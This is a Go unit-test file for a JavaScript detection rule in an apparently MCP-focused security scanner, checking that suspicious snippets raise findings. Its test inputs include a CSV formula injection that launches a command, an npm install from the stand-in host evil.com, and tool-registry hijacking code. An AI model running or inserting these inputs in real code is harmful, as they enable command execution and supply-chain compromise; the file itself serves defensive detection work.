package rules

import (
	"testing"

	"github.com/FlppFer/MCPGuard/internal/service/static_analysis/languages/javascript"
)

func TestJSMaliciousUserRule_ID(t *testing.T) {
	rule := NewJSMaliciousUserRule()
	if rule.ID() != "MCP-JS-MUA-001" {
		t.Errorf("ID() = %v, want MCP-JS-MUA-001", rule.ID())
	}
}

func TestJSMaliciousUserRule_AppliesToLanguage(t *testing.T) {
	rule := NewJSMaliciousUserRule()
	if rule.AppliesToLanguage() != "javascript" {
		t.Errorf("AppliesToLanguage() = %v, want javascript", rule.AppliesToLanguage())
	}
}

func TestJSMaliciousUserRule_Evaluate(t *testing.T) {
	tests := []struct {
		name         string
		code         string
		wantFindings bool
		minFindings  int
	}{
		{
			name:         "dynamic tool registration",
			code:         `register_tool("malicious", handler);`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name:         "direct tool registry modification",
			code:         `tools["admin_tool"] = maliciousHandler;`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name:         "CSV formula injection",
			code:         `const data = '=cmd | "calc"';`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name:         "bearer token handling",
			code:         `const header = "authorization: bearer eyJhbGc...";`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name:         "MCP installer reference",
			code:         `const pkg = "mcp-installer";`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name:         "insecure npm registry",
			code:         `const cmd = "npm install --registry http://evil.com/";`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name:         "stack trace exposure",
			code:         `res.json({ error: msg, stack: err.stack });`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name:         "safe code",
			code:         `const x = 42; const arr = [1, 2, 3];`,
			wantFindings: false,
		},
	}

	rule := NewJSMaliciousUserRule()
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ast, err := javascript.ParseJavaScriptSource("test.js", []byte(tt.code))
			if err != nil {
				t.Fatalf("Failed to parse: %v", err)
			}
			findings, err := rule.Evaluate(ast)
			if err != nil {
				t.Fatalf("Evaluate() error = %v", err)
			}
			if tt.wantFindings && len(findings) < tt.minFindings {
				t.Errorf("Expected at least %d findings, got %d", tt.minFindings, len(findings))
			}
			if !tt.wantFindings && len(findings) > 0 {
				t.Errorf("Expected no findings, got %d: %+v", len(findings), findings)
			}
		})
	}
}

func TestJSMaliciousUserRule_NonJSAST(t *testing.T) {
	rule := NewJSMaliciousUserRule()
	findings, err := rule.Evaluate("not a JS ast")
	if err != nil {
		t.Errorf("Should not error, got %v", err)
	}
	if findings != nil {
		t.Errorf("Should return nil, got %v", findings)
	}
}
